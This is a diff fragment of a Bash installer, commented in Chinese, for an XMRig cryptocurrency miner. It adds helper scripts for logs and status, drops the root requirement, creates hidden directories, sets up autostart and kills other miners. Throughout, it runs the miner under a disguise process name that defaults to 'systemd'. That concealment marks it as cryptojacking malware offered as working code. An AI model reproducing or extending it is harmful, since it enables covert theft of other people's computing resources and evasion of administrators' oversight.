+        # 检查进程是否成功启动
+        if kill -0 "$mining_pid" 2>/dev/null; then
+            log_info "挖矿进程已在后台启动 (PID: $mining_pid)"
+            echo "$mining_pid" > "$WORK_DIR/miner.pid"
+        else
+            log_error "挖矿进程启动失败"
+            return 1
+        fi
     fi
     
     log_info "挖矿服务已启动"
+}
+
+# 创建日志查看脚本
+create_log_viewer() {
+    log_info "创建日志查看脚本..."
+    
+    cat > "$WORK_DIR/view_logs.sh" << 'EOL'
+#!/bin/bash
+WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+LOG_FILE="$WORK_DIR/miner.log"
+
+echo "=== 挖矿日志查看器 ==="
+echo "日志文件: $LOG_FILE"
+echo "按 Ctrl+C 退出实时查看"
+echo ""
+
+if [ -f "$LOG_FILE" ]; then
+    echo "=== 最近50行日志 ==="
+    tail -n 50 "$LOG_FILE"
+    echo ""
+    echo "=== 实时日志 (按Ctrl+C退出) ==="
+    tail -f "$LOG_FILE"
+else
+    echo "日志文件不存在: $LOG_FILE"
+    echo "请确保挖矿程序已经启动"
+fi
+EOL
+    
+    chmod +x "$WORK_DIR/view_logs.sh"
+    
+    # 创建状态查看脚本
+    cat > "$WORK_DIR/status.sh" << 'EOL'
+#!/bin/bash
+WORK_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+DISGUISE_NAME="$(cat "$WORK_DIR/../.disguise_name" 2>/dev/null || echo "systemd")"
+
+echo "=== XMRig 挖矿状态 ==="
+echo ""
+
+# 检查进程状态
+if pidof "$DISGUISE_NAME" >/dev/null || pidof xmrig >/dev/null; then
+    echo "✓ 挖矿进程正在运行"
+    
+    # 显示进程信息
+    echo ""
+    echo "进程信息:"
+    ps aux | grep -E "(xmrig|$DISGUISE_NAME)" | grep -v grep | head -5
+    
+    # 显示最近的日志
+    if [ -f "$WORK_DIR/miner.log" ]; then
+        echo ""
+        echo "最近日志 (最后10行):"
+        tail -n 10 "$WORK_DIR/miner.log"
+    fi
+else
+    echo "✗ 挖矿进程未运行"
+fi
+
+echo ""
+echo "管理命令:"
+echo "  查看日志: $WORK_DIR/view_logs.sh"
+echo "  启动挖矿: $WORK_DIR/miner.sh --config=$WORK_DIR/config.json"
+echo "  停止挖矿: killall $DISGUISE_NAME"
+EOL
+    
+    chmod +x "$WORK_DIR/status.sh"
+    
+    log_info "日志查看脚本创建完成"
 }
 
 # 显示状态信息
@@ -1181,17 +1022,19 @@ show_status() {
     log_info "进程名称: $DISGUISE_NAME"
     log_info "服务名称: $SERVICE_NAME"
     log_info "运行环境: $([ "$IS_CONTAINER" = true ] && echo "容器环境" || echo "主机环境")"
+    log_info "权限模式: $([ "$HAS_SUDO" = true ] && echo "sudo权限" || echo "用户权限")"
     echo
     log_info "=== 管理命令 ==="
     
     if [ "$IS_CONTAINER" = true ]; then
         log_info "容器环境管理命令:"
-        log_info "查看进程: ps aux | grep $DISGUISE_NAME"
-        log_info "停止挖矿: pkill -f $DISGUISE_NAME"
+        log_info "查看状态: $WORK_DIR/status.sh"
+        log_info "查看日志: $WORK_DIR/view_logs.sh"
+        log_info "停止挖矿: killall $DISGUISE_NAME"
         log_info "手动启动: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
-        log_info "后台启动: cd $WORK_DIR && nohup ./$DISGUISE_NAME --config=config.json > /dev/null 2>&1 &"
-        if [ -f "$WORK_DIR/xmrig.pid" ]; then
-            local pid=$(cat "$WORK_DIR/xmrig.pid")
+        log_info "后台启动: cd $WORK_DIR && nohup ./$DISGUISE_NAME --config=config.json > miner.log 2>&1 &"
+        if [ -f "$WORK_DIR/miner.pid" ]; then
+            local pid=$(cat "$WORK_DIR/miner.pid")
             if kill -0 "$pid" 2>/dev/null; then
                 log_info "当前状态: 运行中 (PID: $pid)"
             else
@@ -1199,34 +1042,37 @@ show_status() {
             fi
         fi
     else
-        if command -v systemctl >/dev/null 2>&1; then
-            log_info "查看状态: systemctl status $SERVICE_NAME"
-            log_info "停止挖矿: systemctl stop $SERVICE_NAME"
-            log_info "启动挖矿: systemctl start $SERVICE_NAME"
-            log_info "重启挖矿: systemctl restart $SERVICE_NAME"
-            log_info "查看日志: journalctl -u $SERVICE_NAME -f"
+        if [ "$HAS_SUDO" = true ] && command -v systemctl >/dev/null 2>&1; then
+            log_info "systemd服务管理命令:"
+            log_info "查看状态: sudo systemctl status $SERVICE_NAME"
+            log_info "查看日志: sudo journalctl -u $SERVICE_NAME -f"
+            log_info "停止挖矿: sudo systemctl stop $SERVICE_NAME"
+            log_info "启动挖矿: sudo systemctl start $SERVICE_NAME"
+            log_info "重启挖矿: sudo systemctl restart $SERVICE_NAME"
         else
-            log_info "查看状态: service $SERVICE_NAME status"
-            log_info "停止挖矿: service $SERVICE_NAME stop"
-            log_info "启动挖矿: service $SERVICE_NAME start"
-            log_info "重启挖矿: service $SERVICE_NAME restart"
+            log_info "用户模式管理命令:"
+            log_info "查看状态: $WORK_DIR/status.sh"
+            log_info "查看日志: $WORK_DIR/view_logs.sh"
+            log_info "停止挖矿: killall $DISGUISE_NAME"
+            log_info "启动挖矿: $WORK_DIR/miner.sh --config=$WORK_DIR/config.json"
         fi
     fi
     echo
+    log_info "=== 便捷脚本 ==="
+    log_info "查看状态: $WORK_DIR/status.sh"
+    log_info "查看日志: $WORK_DIR/view_logs.sh"
+    log_info "启动脚本: $WORK_DIR/miner.sh"
     log_info "配置文件: $WORK_DIR/config.json"
-    log_info "手动运行: cd $WORK_DIR && ./$DISGUISE_NAME --config=config.json"
+    log_info "日志文件: $WORK_DIR/miner.log"
 }
 
 # 主函数
 main() {
-    # 检查是否为root用户
-    if [ "$EUID" -ne 0 ]; then
-        log_error "请使用root权限运行此脚本"
-        exit 1
-    fi
+    # 检测sudo权限
+    check_sudo_permissions
     
-    # 首先检测并终止现有的xmrig进程
-    kill_existing_xmrig
+    # 检测并终止现有的挖矿进程
+    kill_existing_miner
     
     # 获取伪装名称
     DISGUISE_NAME=$(get_disguise_name)
@@ -1240,9 +1086,12 @@ main() {
     detect_system
     set_version
     get_download_url
+    create_hidden_dirs
     check_prerequisites
     download_and_install
     create_config
+    create_miner_script
+    create_log_viewer
     setup_autostart
     start_mining
     show_status
